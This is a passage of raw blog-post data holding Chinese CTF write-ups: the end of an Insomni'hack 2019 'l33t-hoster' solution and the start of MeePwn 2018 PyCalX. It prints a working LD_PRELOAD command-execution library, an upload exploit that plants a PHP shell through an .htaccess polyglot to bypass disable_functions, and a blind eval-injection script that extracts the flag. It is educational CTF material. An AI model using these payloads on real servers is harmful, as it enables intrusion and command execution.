<span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">payload</span><span class=\"params\">(<span class=\"keyword\">char</span> *cmd)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> buf[<span class=\"number\">512</span>];</span><br><span class=\"line\">  <span class=\"built_in\">strcpy</span>(buf, cmd);</span><br><span class=\"line\">  <span class=\"built_in\">strcat</span>(buf, <span class=\"string\">&quot; &gt; /tmp/_0utput.txt&quot;</span>);</span><br><span class=\"line\">  system(buf);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">getuid</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> *cmd;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (getenv(<span class=\"string\">&quot;LD_PRELOAD&quot;</span>) == <span class=\"literal\">NULL</span>) &#123; <span class=\"keyword\">return</span> <span class=\"number\">0</span>; &#125;</span><br><span class=\"line\">  unsetenv(<span class=\"string\">&quot;LD_PRELOAD&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((cmd = getenv(<span class=\"string\">&quot;_evilcmd&quot;</span>)) != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">    payload(cmd);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>上述代码将从环境变量_evilcmd 中执行命令，结果重定向到 /tmp/_0utput.txt 中，那么 shell.tiaonmmn 需要完成的就是 putenv LD_PRELOAD 和_evilcmd，调用 mail () 函数，最后读 /tmp/_0utput.txt 文件。我们的 Python 脚本要更新一下了：</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">VALID_WBMP = <span class=\"string\">b&quot;\\x00\\x00\\x8a\\x39\\x8a\\x39\\x0a&quot;</span></span><br><span class=\"line\">URL = <span class=\"string\">&quot;http://35.246.234.136/&quot;</span></span><br><span class=\"line\">RANDOM_DIRECTORY = <span class=\"string\">&quot;ad759ad95e5482e02a15c5d30042b588b6630e64&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">COOKIES = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;PHPSESSID&quot;</span> : <span class=\"string\">&quot;0e7eal0ji7seg6ac3ck7d2csd8&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">upload_content</span>(<span class=\"params\">name, content</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;image&quot;</span> : (name, content, <span class=\"string\">&#x27;image/png&#x27;</span>),</span><br><span class=\"line\">        <span class=\"string\">&quot;upload&quot;</span> : (<span class=\"literal\">None</span>, <span class=\"string\">&quot;Submit Query&quot;</span>, <span class=\"literal\">None</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    response = requests.post(URL, files=data, cookies=COOKIES)</span><br><span class=\"line\"></span><br><span class=\"line\">HT_ACCESS = VALID_WBMP + <span class=\"string\">b&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">AddType application/x-httpd-php .corb3nik</span></span><br><span class=\"line\"><span class=\"string\">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">TARGET_FILE = VALID_WBMP + <span class=\"string\">b&quot;AA&quot;</span> + base64.b64encode(<span class=\"string\">b&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php</span></span><br><span class=\"line\"><span class=\"string\">move_uploaded_file($_FILES[&#x27;evil&#x27;][&#x27;tmp_name&#x27;], &#x27;/tmp/evil.so&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">putenv(&#x27;LD_PRELOAD=/tmp/evil.so&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">putenv(&quot;_evilcmd=uname -a&quot;);</span></span><br><span class=\"line\"><span class=\"string\">mail(&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">echo file_get_contents(&#x27;/tmp/_0utput.txt&#x27;);</span></span><br><span class=\"line\"><span class=\"string\">?&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;..htaccess&quot;</span>, HT_ACCESS)</span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;shell.corb3nik&quot;</span>, TARGET_FILE)</span><br><span class=\"line\">upload_content(<span class=\"string\">&quot;trigger.corb3nik&quot;</span>, VALID_WBMP)</span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123; <span class=\"string\">&quot;evil&quot;</span> : open(<span class=\"string\">&quot;../payloads/evil.so&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) &#125;</span><br><span class=\"line\">response = requests.post(URL + <span class=\"string\">&quot;/images/&quot;</span> + RANDOM_DIRECTORY + <span class=\"string\">&quot;/trigger.corb3nik&quot;</span>, files=files)</span><br><span class=\"line\">print(response.text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>我们尝试执行一下 get_flag 命令：</p>\r\n<img src=\"/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/get_flag.png\" class=\"\" title=\"Get Flag?\">\r\n<p>啊，看来还没有结束。</p>\r\n<h1 id=\"part-3.-get-the-fking-flag\">Part 3. Get the f**king flag</h1>\r\n<p>  把 get_flag 下载到本地，IDA 分析发现这个程序随机生成数字，要求在 1s 内给出答案，否则程序退出。那么，同样的思路，不过 so 库文件要完成一系列的操作了。</p>\r\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;signal.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;sys/prctl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">pid_t</span> pid = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> inpipefd[<span class=\"number\">2</span>];</span><br><span class=\"line\">        <span class=\"keyword\">int</span> outpipefd[<span class=\"number\">2</span>];</span><br><span class=\"line\">    </span><br><span class=\"line\">        pipe(inpipefd);</span><br><span class=\"line\">        pipe(outpipefd);</span><br><span class=\"line\">        pid = fork();</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (pid == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">                dup2(outpipefd[<span class=\"number\">0</span>], STDIN_FILENO);</span><br><span class=\"line\">                dup2(inpipefd[<span class=\"number\">1</span>], STDOUT_FILENO);</span><br><span class=\"line\">                dup2(inpipefd[<span class=\"number\">1</span>], STDERR_FILENO);</span><br><span class=\"line\">                prctl(PR_SET_PDEATHSIG, SIGTERM);</span><br><span class=\"line\">                execl(<span class=\"string\">&quot;/get_flag&quot;</span>, <span class=\"string\">&quot;get_flag&quot;</span>, (<span class=\"keyword\">char</span>*) <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">                <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"built_in\">close</span>(outpipefd[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        <span class=\"built_in\">close</span>(inpipefd[<span class=\"number\">1</span>]);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">char</span> data[<span class=\"number\">0xff</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// Read first line</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (; data[<span class=\"number\">0</span>] != <span class=\"string\">&#x27;\\n&#x27;</span>; <span class=\"built_in\">read</span>(inpipefd[<span class=\"number\">0</span>], data, <span class=\"number\">1</span>));</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"comment\">// Read captcha</span></span><br><span class=\"line\">        <span class=\"built_in\">read</span>(inpipefd[<span class=\"number\">0</span>], data, <span class=\"number\">0xff</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">uint64_t</span> sum = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">char</span> *pch;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Raw : %s\\n&quot;</span>, data);</span><br><span class=\"line\">        pch = strtok (data, <span class=\"string\">&quot;+&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sum : %lu\\n&quot;</span>, sum);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (pch != <span class=\"number\">0</span>)  &#123;</span><br><span class=\"line\">                sum += strtoull(pch, <span class=\"number\">0</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Operand : %lu\\n&quot;</span>, atol(pch));</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sum : %lu\\n&quot;</span>, sum);</span><br><span class=\"line\">                pch = strtok (<span class=\"number\">0</span>, <span class=\"string\">&quot;+&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"keyword\">char</span> result[<span class=\"number\">32</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">        <span class=\"built_in\">sprintf</span>(result, <span class=\"string\">&quot;%lu\\n&quot;</span>, sum);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Result : %lu\\n&quot;</span>, sum);</span><br><span class=\"line\">    </span><br><span class=\"line\">        <span class=\"built_in\">write</span>(outpipefd[<span class=\"number\">1</span>], result, <span class=\"number\">16</span>);</span><br><span class=\"line\">        <span class=\"built_in\">memset</span>(data, <span class=\"number\">0</span>, <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        <span class=\"built_in\">read</span>(inpipefd[<span class=\"number\">0</span>], data, <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Final : %s&quot;</span>, data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>将文件编译完，上传，_evilcmd 执行后，得到结果。最终得到 flag。</p>\r\n\n    <div id=\"aplayer-csqWtlXn\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"21974794\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{67901b58-bd98-4494-b502-df1434c9a6ba}</p>\r\n","categories":["Writeups"],"tags":["Web","Upload","LD_PRELOAD","disable_functions"]},{"title":"MeePwn2018-PyCalX 1-2","url":"/2019/05/15/MeePwn2018-PyCalX-1-2/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>一道 Python 的题，绕沙盒的。环境在<a href=\"https://github.com/Tiaonmmn/meepwn_2018_pycalx\">这</a>。</p>\r\n<h1 id=\"part-1.-pycalx-version1\">Part 1. PyCalX-Version1</h1>\r\n<p>  题目给了源码。 <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> cgi;</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> html <span class=\"keyword\">import</span> escape</span><br><span class=\"line\"></span><br><span class=\"line\">FLAG = open(<span class=\"string\">&#x27;/var/www/flag&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\">OK_200 = <span class=\"string\">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(OK_200)</span><br><span class=\"line\">arguments = cgi.FieldStorage()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;source&#x27;</span> <span class=\"keyword\">in</span> arguments:</span><br><span class=\"line\">    source = arguments[<span class=\"string\">&#x27;source&#x27;</span>].value</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    source = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> source == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span>+escape(str(open(__file__,<span class=\"string\">&#x27;r&#x27;</span>).read()))+<span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;value1&#x27;</span> <span class=\"keyword\">in</span> arguments <span class=\"keyword\">and</span> <span class=\"string\">&#x27;value2&#x27;</span> <span class=\"keyword\">in</span> arguments <span class=\"keyword\">and</span> <span class=\"string\">&#x27;op&#x27;</span> <span class=\"keyword\">in</span> arguments:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_value</span>(<span class=\"params\">val</span>):</span></span><br><span class=\"line\">        val = str(val)[:<span class=\"number\">64</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> str(val).isdigit(): <span class=\"keyword\">return</span> int(val)</span><br><span class=\"line\">        blacklist = [<span class=\"string\">&#x27;(&#x27;</span>,<span class=\"string\">&#x27;)&#x27;</span>,<span class=\"string\">&#x27;[&#x27;</span>,<span class=\"string\">&#x27;]&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>,<span class=\"string\">&#x27;&quot;&#x27;</span>] <span class=\"comment\"># I don&#x27;t like tuple, list and dict.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">or</span> [c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> blacklist <span class=\"keyword\">if</span> c <span class=\"keyword\">in</span> val] != []:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;&lt;center&gt;Invalid value %s&lt;/center&gt;&#x27;</span>%val)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> val</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_op</span>(<span class=\"params\">val</span>):</span></span><br><span class=\"line\">        val = str(val)[:<span class=\"number\">2</span>]</span><br><span class=\"line\">        list_ops = [<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;-&#x27;</span>,<span class=\"string\">&#x27;/&#x27;</span>,<span class=\"string\">&#x27;*&#x27;</span>,<span class=\"string\">&#x27;=&#x27;</span>,<span class=\"string\">&#x27;!&#x27;</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">or</span> val[<span class=\"number\">0</span>] <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> list_ops:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> val</span><br><span class=\"line\">    </span><br><span class=\"line\">    op = get_op(arguments[<span class=\"string\">&#x27;op&#x27;</span>].value)</span><br><span class=\"line\">    value1 = get_value(arguments[<span class=\"string\">&#x27;value1&#x27;</span>].value)</span><br><span class=\"line\">    value2 = get_value(arguments[<span class=\"string\">&#x27;value2&#x27;</span>].value)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> str(value1).isdigit() ^ str(value2).isdigit():</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;&lt;center&gt;Types of the values don\\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    calc_eval = str(repr(value1)) + str(op) + str(repr(value2))</span><br><span class=\"line\">    </span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class=\"string\">&#x27;)&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        result = str(eval(calc_eval))</span><br><span class=\"line\">        <span class=\"keyword\">if</span> result.isdigit() <span class=\"keyword\">or</span> result == <span class=\"string\">&#x27;True&#x27;</span> <span class=\"keyword\">or</span> result == <span class=\"string\">&#x27;False&#x27;</span>:</span><br><span class=\"line\">            print(result)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&quot;Invalid&quot;</span>) <span class=\"comment\"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&quot;Invalid&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>就是用 eval 实现了个简易计算器，而 FLAG 已经读进程序了，暂时不想绕沙盒 getshell 的事情。两个值要求不能出现”、’、[、]、(、) 这些符号，而中间的运算符要求必须是 <code>+ - * / ! =</code> 这几个，但是请注意源码 50 行，它使用的是 op [0]，后面的没做任何限制，因此可以出现 <code>+''</code> 这种符号。而程序允许我们使用字符串运算，但是没法直接返回结果。因此思路非常明确了：通过类似盲注的方式，逐位判断 FLAG。但是我们需要一个第三方能控制的变量，value1 没法真正参与运算。这个时候，我们发现还有一个 source 变量，虽然是用来显示源码的，但是它的作用域是全局，可以参与运算，并且可以控制。那么可以开始写脚本了。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\">url=<span class=\"string\">&quot;http://192.168.60.130/cgi-bin/py.py?source=&#123;0&#125;&amp;value1=&#123;1&#125;&amp;op=&#123;2&#125;&amp;value2=&#123;3&#125;&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">source=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">value1=urllib.parse.quote(<span class=\"string\">&quot;WQERGFD&quot;</span>)</span><br><span class=\"line\">op=urllib.parse.quote(<span class=\"string\">&quot;+&#x27;&quot;</span>)</span><br><span class=\"line\">value2=urllib.parse.quote(<span class=\"string\">&quot; and FLAG&gt;source#&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    prev = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">255</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> chr(i) <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">            source=flag+chr(prev)</span><br><span class=\"line\">            source=urllib.parse.quote(source)</span><br><span class=\"line\">            result=requests.get(url.format(source,value1,op,value2)).text</span><br><span class=\"line\">            <span class=\"comment\">#print(result)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">&quot;False&quot;</span> <span class=\"keyword\">in</span> result <span class=\"keyword\">and</span> <span class=\"string\">&quot;security&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> result:</span><br><span class=\"line\">                flag+=chr(prev<span class=\"number\">-1</span>)</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                prev=i</span><br></pre></td></tr></table></figure>\r\n<p>Python 比较字符串大小的时候，逐位判断，第一位相同时比较下一位。因此我们不需要 [1] 这种指示位数。</p>\r\n<h1 id=\"part-2.-pycalx-version2\">Part 2. PyCalX-Version2</h1>\r\n<p>  第一个版本的 PyCalX 由于 op 没有仔细判断，第二个版本的就改过来了。   <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"comment\">#!/usr/bin/env python3</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> cgi;</span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">from</span> html <span class=\"keyword\">import</span> escape</span><br><span class=\"line\"></span><br><span class=\"line\">FLAG = open(<span class=\"string\">&#x27;/var/www/flag&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\">OK_200 = <span class=\"string\">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">print(OK_200)</span><br><span class=\"line\">arguments = cgi.FieldStorage()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;source&#x27;</span> <span class=\"keyword\">in</span> arguments:</span><br><span class=\"line\">    source = arguments[<span class=\"string\">&#x27;source&#x27;</span>].value</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    source = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> source == <span class=\"string\">&#x27;1&#x27;</span>:</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span>+escape(str(open(__file__,<span class=\"string\">&#x27;r&#x27;</span>).read()))+<span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> <span class=\"string\">&#x27;value1&#x27;</span> <span class=\"keyword\">in</span> arguments <span class=\"keyword\">and</span> <span class=\"string\">&#x27;value2&#x27;</span> <span class=\"keyword\">in</span> arguments <span class=\"keyword\">and</span> <span class=\"string\">&#x27;op&#x27;</span> <span class=\"keyword\">in</span> arguments:</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_value</span>(<span class=\"params\">val</span>):</span></span><br><span class=\"line\">        val = str(val)[:<span class=\"number\">64</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> str(val).isdigit(): <span class=\"keyword\">return</span> int(val)</span><br><span class=\"line\">        blacklist = [<span class=\"string\">&#x27;(&#x27;</span>,<span class=\"string\">&#x27;)&#x27;</span>,<span class=\"string\">&#x27;[&#x27;</span>,<span class=\"string\">&#x27;]&#x27;</span>,<span class=\"string\">&#x27;\\&#x27;&#x27;</span>,<span class=\"string\">&#x27;&quot;&#x27;</span>] <span class=\"comment\"># I don&#x27;t like tuple, list and dict.</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> val == <span class=\"string\">&#x27;&#x27;</span> <span class=\"keyword\">or</span> [c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> blacklist <span class=\"keyword\">if</span> c <span class=\"keyword\">in</span> val] != []:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class=\"line\">            sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> val</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_op</span>(<span class=\"params\">val</span>):</span></span><br><span class=\"line\">        val = str(val)[:<span class=\"number\">2</span>]</span><br><span class=\"line\">        list_ops = [<span class=\"string\">&#x27;+&#x27;</span>,<span class=\"string\">&#x27;-&#x27;</span>,<span class=\"string\">&#x27;/&#x27;</span>,<span class=\"string\">&#x27;*&#x27;</span>,<span 